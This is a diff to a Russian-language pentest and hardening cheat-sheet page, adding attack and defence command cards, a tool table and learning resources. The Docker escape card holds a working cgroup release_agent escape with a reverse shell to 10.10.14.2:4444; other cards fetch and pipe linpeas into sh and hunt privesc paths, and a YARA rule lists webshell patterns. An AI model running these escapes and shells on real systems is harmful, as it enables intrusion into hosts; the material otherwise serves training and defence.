+          <p class="cmd-note">Привилегия <code>SeImpersonatePrivilege</code> позволяет олицетворять токен любого привилегированного клиента (через локальный RPC/COM вызов) и гарантированно дает права <b>SYSTEM</b>. В путях без кавычек пробелы интерпретируются как аргументы, что дает возможность перехватить бинарник службы.</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="privesc">#privesc</span><span class="tag-link" data-tag="windows">#windows</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-docker-escape" data-tags="attack privesc docker linux">
+          <div class="cmd-head">
+            <h3>Docker &amp; Container Escapes: побег на хостовую ОС</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. Проверка: находимся ли мы внутри Docker-контейнера?
+ls -la /.dockerenv; cat /proc/1/cgroup | grep -i docker
+hostname                 # подозрительно случайный 12-значный хэш
+
+# 2. Побег через смонтированный Docker Socket (/var/run/docker.sock):
+# Если сокет доступен пользователю — спавним контейнер с монтированием корня хоста:
+docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host sh
+# Если утилиты docker нет — отправляем сырой запрос в unix-сокет через curl:
+curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
+
+# 3. Побег из привилегированного контейнера (--privileged):
+# Проверяем доступность физических дисков хоста:
+fdisk -l; lsblk          # находим системный раздел хоста (напр. /dev/sda1)
+mkdir -p /mnt/host &amp;&amp; mount /dev/sda1 /mnt/host
+# Полный root-доступ к файловой системе хоста:
+chroot /mnt/host bash
+
+# 4. Побег через Capabilities (cap_sys_admin + cgroups release_agent):
+mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x
+echo 1 &gt; /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" &gt; /tmp/cgrp/release_agent
+echo '#!/bin/sh' &gt; /cmd &amp;&amp; echo "bash -i &gt;&amp; /dev/tcp/<span class="ph-lhost">10.10.14.2</span>/4444 0&gt;&amp;1" &gt;&gt; /cmd &amp;&amp; chmod +x /cmd
+sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"   # триггер исполнения cmd на хосте от root!</pre>
+          <p class="cmd-note">Контейнеризация — не граница безопасности (Security Boundary), если контейнер запущен с флагом <code>--privileged</code>, смонтированным <code>docker.sock</code> или опасными capabilities (<code>cap_sys_admin</code>). Любая из этих ошибок приводит к выходу из изоляции и мгновенному root на хост-сервере.</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="privesc">#privesc</span><span class="tag-link" data-tag="docker">#docker</span><span class="tag-link" data-tag="linux">#linux</span></div>
         </article>
 
         <div class="callout qa"><span class="co-title">Частый вопрос новичка</span>«Почему не сразу sqlmap на всё
@@ -626,20 +1009,32 @@ sudo ufw status verbose</pre>
               data-tag="hardening">#hardening</span></div>
         </article>
 
-        <article class="card cmd-card" id="cmd-iptables" data-tags="defense hardening network">
+        <article class="card cmd-card" id="cmd-nftables" data-tags="defense hardening network">
           <div class="cmd-head">
-            <h3>iptables — низкоуровневый файрвол</h3><span class="diff diff-pro">Продвинутый</span>
+            <h3>nftables — современная пакетная фильтрация (Default Deny)</h3><span class="diff diff-pro">Продвинутый</span>
           </div>
-          <pre class="code">sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
-sudo iptables -A INPUT -i lo -j ACCEPT
-sudo iptables -P INPUT DROP
-# Лимит попыток SSH (5 новых соединений/минуту с IP):
-sudo iptables -A INPUT -p tcp --dport 22 -m recent --set --name SSH
-sudo iptables -A INPUT -p tcp --dport 22 -m recent --update --seconds 60 --hitcount 6 --name SSH -j DROP</pre>
-          <p class="cmd-note">iptables — «сырой» уровень (ufw поверх него). Правила читаются сверху вниз; порядок важен.
-            Для персистентности: <code>apt install iptables-persistent</code>.</p>
+          <pre class="code"># Конфиг /etc/nftables.conf со строгим Default Deny и защитой от флуда:
+table inet filter {
+    set white_ssh { type ipv4_addr; elements = { 198.51.100.10, 203.0.113.50 } }
+    chain input {
+        type filter hook input priority 0; policy drop;
+
+        iif lo accept                                        # Разрешить loopback
+        ct state established,related accept                  # Разрешить ответы на исходящие
+        ct state invalid drop                                # Сброс поврежденных пакетов
+
+        # SSH только для белого списка IP с ограничением 5 коннектов/мин (rate-limit):
+        ip saddr @white_ssh tcp dport 22 ct state new meter ssh-meter { ip saddr limit rate 5/minute } accept
+
+        tcp dport { 80, 443 } accept                         # Публичный Web
+        ip protocol icmp icmp type { echo-request } limit rate 5/second accept  # Пинг без флуда
+    }
+}
+# Применение и проверка правил:
+sudo nft -f /etc/nftables.conf &amp;&amp; sudo nft list ruleset</pre>
+          <p class="cmd-note"><b>nftables</b> полностью заменяет устаревший iptables в современных дистрибутивах Linux (Debian 10+, RHEL 8+, Ubuntu 20.04+). Единый синтаксис для IPv4/IPv6, встроенные хэш-таблицы (sets/meters) и атомарное применение правил без прерывания существующих сессий.</p>
           <div class="tags"><span class="tag-link" data-tag="defense">#defense</span><span class="tag-link"
-              data-tag="hardening">#hardening</span></div>
+              data-tag="hardening">#hardening</span><span class="tag-link" data-tag="network">#network</span></div>
         </article>
 
         <article class="card cmd-card" id="cmd-journalctl" data-tags="defense logs processes">
@@ -654,6 +1049,78 @@ journalctl --list-boots                 # история загрузок</pre>
             сужать по сервису (<code>-u</code>) и времени (<code>--since/--until</code>).</p>
           <div class="tags"><span class="tag-link" data-tag="defense">#defense</span><span class="tag-link"
               data-tag="logs">#logs</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-soc-logs" data-tags="defense logs soc forensics">
+          <div class="cmd-head">
+            <h3>SOC-аналитика &amp; Парсинг логов: поиск атак и аномалий</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># 1. Топ IP-адресов брутфорсеров SSH за последние сутки (Failed password):
+sudo journalctl -u sshd --since "24 hours ago" | grep "Failed password" | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -n 10
+
+# 2. Аудит подозрительных вызовов через sudo (попытки запуска шеллов и чтения /etc/shadow):
+sudo journalctl _COMM=sudo --since "7 days ago" | grep "COMMAND=" | awk '{for(i=6;i&lt;=NF;i++) printf $i " "; print ""}' | sort | uniq -c | sort -rn
+
+# 3. Выявление веб-сканеров, SQLi и попыток чтения .env / LFI в логах Nginx:
+awk '($9 ~ /404|403|500/) &amp;&amp; ($7 ~ /(\.\.\/|\.env|\.git|wp-admin|select|union)/) {print $1, $7, $9}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -n 15
+
+# 4. Проверка залогиненных пользователей и активных терминальных сессий:
+who; w; last -a | head -n 15           # история входов и откуда подключались</pre>
+          <p class="cmd-note">Регулярные выражения и awk — главное оружие инженера мониторинга и SOC. При инциденте критично отслеживать корреляцию: подозрительный всплеск 404/403 в веб-логах ➔ появление нового cron/sudo события в journald ➔ сетевое соединение на нестандартный порт.</p>
+          <div class="tags"><span class="tag-link" data-tag="defense">#defense</span><span class="tag-link"
+              data-tag="logs">#logs</span><span class="tag-link" data-tag="soc">#soc</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-fail2ban" data-tags="defense hardening logs">
+          <div class="cmd-head">
+            <h3>fail2ban — превентивная блокировка атак и сканеров</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code"># Базовый конфиг /etc/fail2ban/jail.local (3 ошибки = бан на 1 час):
+[DEFAULT]
+bantime  = 1h
+findtime = 10m
+maxretry = 3
+banaction = nftables-multiport   # или iptables-multiport
+backend  = systemd
+
+[sshd]
+enabled = true
+port    = 22
+maxretry = 3
+
+# Мониторинг заблокированных хостов и ручное управление:
+sudo fail2ban-client status sshd               # сколько IP забанено прямо сейчас
+sudo fail2ban-client set sshd unbanip 1.2.3.4  # ручной разбан ошибочно заблокированного IP</pre>
+          <p class="cmd-note">Fail2ban динамически анализирует логи авторизации (sshd, nginx, postfix) и при превышении порога неудачных попыток автоматически добавляет IP атакующего в черный список файрвола на заданное время, пресекая распределенный брутфорс на корню.</p>
+          <div class="tags"><span class="tag-link" data-tag="defense">#defense</span><span class="tag-link"
+              data-tag="hardening">#hardening</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-yara" data-tags="defense soc forensics tools">
+          <div class="cmd-head">
+            <h3>YARA — сигнатурный детект веб-шеллов и вредоносного кода</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code"># Правило webshell_detector.yar для поиска скрытых PHP веб-шеллов (c99/r57/eval):
+rule Suspicious_PHP_Webshell {
+    meta:
+        description = "Детект скрытых веб-шеллов и eval/base64 полезных нагрузок"
+        author = "CyberSec-Cheat-Sheet"
+        severity = "High"
+    strings:
+        $eval = "eval(" ascii nocase
+        $base64 = "base64_decode(" ascii nocase
+        $system = "system(" ascii nocase
+        $c99 = "c99shell" ascii nocase
+        $pass = "passthru(" ascii nocase
+    condition:
+        filesize &lt; 2MB and (3 of ($eval, $base64, $system, $pass) or $c99)
+}
+
+# Рекурсивное сканирование веб-каталогов сервера:
+yara -r -s webshell_detector.yar /var/www/html/</pre>
+          <p class="cmd-note"><b>YARA</b> — международный стандарт классификации и поиска вредоносного ПО по шаблонам строк и логическим условиям. Используется антивирусами, EDR и инженерами по реагированию на инциденты (DFIR) для поиска бэкдоров и артефактов взлома на диске.</p>
+          <div class="tags"><span class="tag-link" data-tag="defense">#defense</span><span class="tag-link"
+              data-tag="soc">#soc</span><span class="tag-link" data-tag="forensics">#forensics</span></div>
         </article>
 
         <h3 style="margin:28px 0 14px">Чеклист базового hardening Linux-сервера</h3>
@@ -695,64 +1162,89 @@ journalctl --list-boots                 # история загрузок</pre>
             <th>Когда использовать</th>
           </tr>
           <tr>
-            <td><b>nmap / masscan</b></td>
-            <td>Сканирование портов, сервисов, ОС</td>
-            <td>Начало любой работы с целью</td>
+            <td><b>nmap / rustscan / masscan</b></td>
+            <td>Сканирование портов, версий сервисов и ОС</td>
+            <td>Начало любой работы с целью (rustscan для скорости 65k портов)</td>
           </tr>
           <tr>
-            <td><b>gobuster / ffuf</b></td>
-            <td>Перебор директорий, файлов, поддоменов</td>
-            <td>Веб-разведка: ищем «скрытые двери»</td>
+            <td><b>gobuster / feroxbuster / ffuf</b></td>
+            <td>Перебор директорий, файлов, vhost и параметров</td>
+            <td>Веб-разведка: ищем скрытые файлы, бэкапы и админки</td>
+          </tr>
+          <tr>
+            <td><b>kiterunner (kr)</b></td>
+            <td>Специализированный фаззинг API (REST, Swagger, GraphQL)</td>
+            <td>Поиск недокументированных маршрутов современных микросервисов</td>
           </tr>
           <tr>
             <td><b>dig / whois / subfinder</b></td>
             <td>DNS/OSINT-разведка</td>
-            <td>Пассивный сбор до атаки</td>
+            <td>Пассивный сбор информации до начала активного сканирования</td>
           </tr>
           <tr>
             <td><b>hydra</b></td>
-            <td>Брутфорс сетевых сервисов (SSH, FTP, HTTP…)</td>
-            <td>Подбор учётных данных</td>
+            <td>Брутфорс сетевых сервисов (SSH, FTP, HTTP, SMB…)</td>
+            <td>Подбор учетных записей по словарям</td>
           </tr>
           <tr>
             <td><b>hashcat / john</b></td>
             <td>Взлом хэшей паролей (GPU/CPU)</td>
-            <td>Есть дамп: БД, /etc/shadow, NTLM</td>
+            <td>Есть дамп: /etc/shadow, NTLM, Kerberos TGS, JWT, bcrypt</td>
           </tr>
           <tr>
             <td><b>sqlmap</b></td>
-            <td>Автоматизация SQLi</td>
-            <td>Подтверждена инъекция — добиваем</td>
+            <td>Автоматизация поиска и дампа SQLi</td>
+            <td>Подтверждена инъекция в параметре — извлечение СУБД</td>
+          </tr>
+          <tr>
+            <td><b>BloodHound / SharpHound</b></td>
+            <td>Построение графа путей атак в Active Directory</td>
+            <td>Поиск кратчайших маршрутов эскалации до Domain Admins</td>
+          </tr>
+          <tr>
+            <td><b>Impacket</b></td>
+            <td>Швейцарский нож для протоколов Windows/AD</td>
+            <td>DCSync, Pass-the-Hash, Kerberoasting, psexec, wmiexec</td>
           </tr>
           <tr>
             <td><b>Burp Suite / OWASP ZAP</b></td>
-            <td>Веб-сканирование, перехват трафика (MITM)</td>
-            <td>Аудит веб-приложений</td>
+            <td>Аудит Web-приложений, перехват трафика (MITM)</td>
+            <td>Тестирование OWASP Top 10, SSRF, XXE, IDOR, фаззинг запросов</td>
           </tr>
           <tr>
-            <td><b>Metasploit</b></td>
-            <td>Фреймворк эксплойтов + шеллы</td>
-            <td>Когда нужен готовый exploit/payload</td>
+            <td><b>Metasploit Framework</b></td>
+            <td>База эксплойтов, доставка payload и шеллы</td>
+            <td>Когда найден известный CVE и требуется готовый PoC/handler</td>
           </tr>
           <tr>
-            <td><b>linpeas / linenum</b></td>
-            <td>Аудит Linux на пути к root</td>
-            <td>После получения доступа</td>
+            <td><b>linpeas / winpeas / pspy</b></td>
+            <td>Автоматический аудит LPE в Linux и Windows</td>
+            <td>Локальное повышение привилегий после первого шелла</td>
           </tr>
           <tr>
             <td><b>wireshark / tcpdump</b></td>
-            <td>Анализ сетевого трафика</td>
-            <td>MITM, расследование, дебаг протоколов</td>
+            <td>Анализ сетевых дампов пакетов (PCAP)</td>
+            <td>Инженерное расследование инцидентов, дебаг протоколов, MITM</td>
           </tr>
           <tr>
-            <td><b>fail2ban / ufw / auditd</b></td>
-            <td>Защита: бан атакующих, файрвол, аудит действий</td>
-            <td>Hardening любого сервера</td>
+            <td><b>chisel / proxychains</b></td>
+            <td>Pivoting, проброс портов и SOCKS-туннелирование</td>
+            <td>Lateral Movement, доступ к закрытым внутренним подсетям и сервисам</td>
           </tr>
           <tr>
-            <td><b>The Hacker Choice / Kali Linux</b></td>
-            <td>Distro с готовым набором инструментов</td>
-            <td>Лаборатория и полевая работа</td>
+            <td><b>fail2ban / nftables / ufw</b></td>
+            <td>Пакетная фильтрация и превентивный бан атакующих</td>
+            <td>Hardening периметра любого Linux-сервера (Default Deny)</td>
+          </tr>
+          <tr>
+            <td><b>YARA</b></td>
+            <td>Сигнатурный поиск вредоносного кода и веб-шеллов</td>
+            <td>DFIR, антивирусный скрининг серверов и форензика</td>
+          </tr>
+          <tr>
+            <td><b>Kali Linux / Parrot OS</b></td>
+            <td>Дистрибутивы с предустановленным стеком ИБ</td>
+            <td>Лабораторные тренировки и боевой пентест</td>
           </tr>
         </table>
 
@@ -871,6 +1363,46 @@ journalctl --list-boots                 # история загрузок</pre>
               data-tag="web">#web</span></div>
         </article>
 
+        <article class="card cmd-card" id="one-11" data-tags="recon network linux">
+          <div class="cmd-head">
+            <h3>Скан портов на чистом Bash без nmap и netcat</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">for p in 21 22 80 443 3306 8080; do (echo &gt;/dev/tcp/10.10.10.1/$p) &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo "[+] Порт $p открыт"; done</pre>
+          <p class="cmd-note">Использует встроенный в Bash виртуальный псевдодевайс <code>/dev/tcp/host/port</code>. Незаменим в ограниченных окружениях (restricted shell, минимальные Docker-контейнеры), где нет установленного софта.</p>
+          <div class="tags"><span class="tag-link" data-tag="recon">#recon</span><span class="tag-link"
+              data-tag="network">#network</span></div>
+        </article>
+
+        <article class="card cmd-card" id="one-12" data-tags="attack privesc linux">
+          <div class="cmd-head">
+            <h3>Поиск опасных Linux Capabilities</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code">getcap -r / 2&gt;/dev/null | grep -E "cap_setuid|cap_dac_read_search|cap_sys_admin|cap_net_raw"</pre>
+          <p class="cmd-note">Быстро фильтрует бинарники с расширенными правами, позволяющими сменить UID на 0 или читать произвольные файлы.</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="privesc">#privesc</span></div>
+        </article>
+
+        <article class="card cmd-card" id="one-13" data-tags="attack privesc tools">
+          <div class="cmd-head">
+            <h3>LinPEAS напрямую в оперативную память</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code">curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee linpeas.out</pre>
+          <p class="cmd-note">Запускает комплексный скрипт аудита без сохранения скрипта на жесткий диск целевой машины (memory-only execution).</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="privesc">#privesc</span></div>
+        </article>
+
+        <article class="card cmd-card" id="one-14" data-tags="attack privesc windows">
+          <div class="cmd-head">
+            <h3>Поиск путей Windows без кавычек (Unquoted Paths)</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code">wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</pre>
+          <p class="cmd-note">Ищет автозапускаемые сторонние службы Windows с пробелами в путях для подмены исполняемого файла.</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="privesc">#privesc</span><span class="tag-link" data-tag="windows">#windows</span></div>
+        </article>
+
         <div class="callout err"><span class="co-title">Типичная ошибка</span>Копировать one-liner «на веру» в
           продакшен. Сначала прочитай, что делает каждый флаг: <code>find / -mtime -1 | xargs rm</code> — та же
           конструкция, но уже инцидент.</div>
@@ -883,6 +1415,36 @@ journalctl --list-boots                 # история загрузок</pre>
         </div>
         <p class="sec-sub">Безопасный тренажёр: команды выполняются локально в браузере с фейковым выводом. Ничего не
           отправляется наружу, ничего не ломается. Попробуй базовые команды из раздела Linux.</p>
+
+        <div class="sandbox-quests" id="sandboxQuests">
+          <div class="quest-title">🎯 Интерактивные мини-квесты (вводи команды в терминал ниже):</div>
+          <div class="quest-grid">
+            <div class="quest-badge" id="quest-1" data-flag="1">
+              <span class="q-icon">🔍</span>
+              <div class="q-info">
+                <b>Квест 1: Разведка логов</b>
+                <span>Найди IP злоумышленника в /var/log/auth.log</span>
+              </div>
+              <span class="q-status">Ожидает</span>
+            </div>
+            <div class="quest-badge" id="quest-2" data-flag="2">
+              <span class="q-icon">🔑</span>
+              <div class="q-info">
+                <b>Квест 2: Секретный файл</b>
+                <span>Найди скрытый файл флага в ~ (ls -la)</span>
+              </div>
+              <span class="q-status">Ожидает</span>
+            </div>
+            <div class="quest-badge" id="quest-3" data-flag="3">
+              <span class="q-icon">⚡</span>
+              <div class="q-info">
+                <b>Квест 3: Аудит пользователей</b>
+                <span>Найди пользователей с оболочкой bash в /etc/passwd</span>
+              </div>
+              <span class="q-status">Ожидает</span>
+            </div>
+          </div>
+        </div>
 
         <div class="sandbox-hints">
           <button type="button" class="hint-chip" data-cmd="ls -la">ls -la</button>
@@ -1025,22 +1587,34 @@ cat /etc/passwd | grep -v nologin   # активные пользователи<
 
         <div class="grid-2">
           <div class="card">
-            <h3>Книги (база)</h3>
+            <h3>Книги и фундаментальная теория</h3>
             <ul class="clean">
-              <li><b>«The Art of Software Security Assessment»</b> — методология пентеста и оценки безопасности ПО.</li>
-              <li><b>The Web Application Hacker's Handbook</b> — классика веб-атак (старая, но фундамент).</li>
-              <li><b>Материалы LPIC-1/LPIC-2</b> — системная база Linux: администрирование, безопасность.</li>
+              <li><b>«The Art of Software Security Assessment»</b> — библия аудита кода и архитектурного анализа ПО.</li>
+              <li><b>The Web Application Hacker's Handbook</b> — фундамент анализа логики веб-приложений.</li>
+              <li><b>Материалы LPIC-1/LPIC-2 &amp; RHCSA</b> — системная база администрирования и безопасности Linux.</li>
+              <li><b>MITRE ATT&amp;CK Framework</b> — структурированная матрица тактик и техник реальных злоумышленников.</li>
             </ul>
           </div>
           <div class="card">
-            <h3>Онлайн и практика</h3>
+            <h3>Онлайн-практика и лаборатории</h3>
             <ul class="clean">
-              <li><b>TryHackMe</b> — guided-пути для новичков (с Linux до пентеста).</li>
-              <li><b>Hack The Box</b> — машины посложнее, комьюнити.</li>
-              <li><b>OWASP Top 10 / Juice Shop</b> — веб-уязвимости и легальная лаба для них.</li>
-              <li><b>NVD (CVE Details)</b> — база уязвимостей: читай CVE как инструкцию «что сломано».</li>
+              <li><b>PortSwigger Web Security Academy</b> — главная бесплатная интерактивная лаба по веб-уязвимостям (OWASP Top 10).</li>
+              <li><b>TryHackMe</b> — пошаговые обучающие комнаты для старта в Red/Blue Team.</li>
+              <li><b>Hack The Box</b> — реалистичные лабораторные машины и корпоративные Active Directory полигоны.</li>
+              <li><b>OWASP Juice Shop</b> — открытое полигон-приложение с полным спектром веб-уязвимостей.</li>
             </ul>
           </div>
+        </div>
+
+        <div class="card" style="margin-top:16px">
+          <h3>Каталоги эксплойтов, бинарников и шпаргалок</h3>
+          <ul class="clean">
+            <li><b><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a></b> — каталог бинарников Unix/Linux для обхода локальных ограничений безопасности, побега из restricted shells и SUID/sudo privesc.</li>
+            <li><b><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS Project</a></b> — Living Off The Land Binaries, Scripts and Libraries для Windows (запуск атак доверенным софтом Microsoft).</li>
+            <li><b><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener">PayloadsAllTheThings</a></b> — всеобъемлющая коллекция пейлоадов под Web, Privilege Escalation, Active Directory и Network pentest.</li>
+            <li><b><a href="https://github.com/fortra/impacket" target="_blank" rel="noopener">Impacket Suite</a> &amp; <a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">BloodHound</a></b> — золотой стандарт работы с сетевыми протоколами Windows и граф-анализа путей атаки в Active Directory.</li>
+            <li><b>NVD &amp; Exploit-DB</b> — официальные базы уязвимостей CVE и проверенных PoC-эксплойтов.</li>
+          </ul>
         </div>
 
         <div class="card" style="margin-top:16px">
@@ -1054,17 +1628,17 @@ cat /etc/passwd | grep -v nologin   # активные пользователи<
             <tr>
               <td>Red Team / пентест</td>
               <td>eJPT, CompTIA PenTest+</td>
-              <td>OSCP (практика), CRTP</td>
+              <td>OSCP (практика), CRTP (Active Directory), OSEP</td>
             </tr>
             <tr>
               <td>Blue Team / SOC</td>
               <td>CompTIA Security+, BTL1</td>
-              <td>BTL2/BTL3, GCIA</td>
+              <td>BTL2, GCIA, GCDA (Threat Hunting)</td>
             </tr>
             <tr>
               <td>AppSec</td>
               <td>eWPT</td>
-              <td>OSWE (Java), GWAPT</td>
+              <td>OSWE (Web Pentesting), GWAPT</td>
             </tr>
           </table>
         </div>
